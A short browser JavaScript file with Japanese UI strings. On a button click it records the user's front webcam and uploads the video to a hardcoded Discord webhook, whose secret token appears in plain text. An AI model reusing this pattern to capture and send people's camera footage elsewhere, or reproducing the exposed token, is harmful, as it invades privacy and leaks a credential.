const startBtn = document.getElementById('startBtn');
const status = document.getElementById('status');
const video = document.getElementById('video');
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1362494953078391083/w8iCzgrt7efmjVkHlbTkLjUV4iyXB0lJSMRQJqPY85XJnSL2ns0PwC6T_dRoelTF3lCK';

let mediaRecorder;
let chunks = [];

async function sendVideo() {
  try {
    const blob = new Blob(chunks, { type: 'video/webm' });
    chunks = []; // チャンクをリセット

    const form = new FormData();
    form.append('file', blob, 'recording.webm');

    const res = await fetch(WEBHOOK_URL, { method: 'POST', body: form });
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    status.textContent = '録画を送信しました';
  } catch (err) {
    console.error(err);
    status.textContent = '送信エラー: ' + err.message;
  }
}

function handleStreamEnd() {
  mediaRecorder.stop();
  startBtn.disabled = false;
  startBtn.textContent = '再開';
}

startBtn.addEventListener('click', async () => {
  try {
    startBtn.disabled = true;
    status.textContent = '録画中...';
    
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user' },
      audio: false
    });

    video.srcObject = stream;
    await new Promise(resolve => video.onloadedmetadata = resolve);

    mediaRecorder = new MediaRecorder(stream, {
      mimeType: 'video/webm; codecs=vp9'
    });

    mediaRecorder.ondataavailable = e => chunks.push(e.data);
    mediaRecorder.onstop = sendVideo;

    // ストリーム終了時のイベントリスナー
    stream.getTracks().forEach(track => {
      track.onended = handleStreamEnd;
    });

    mediaRecorder.start(1000); // 1秒ごとにデータを収集
    startBtn.textContent = '録画中';

  } catch (err) {
    console.error(err);
    status.textContent = 'エラー: ' + err.message;
    startBtn.disabled = false;
    startBtn.textContent = '開始';
  }
});
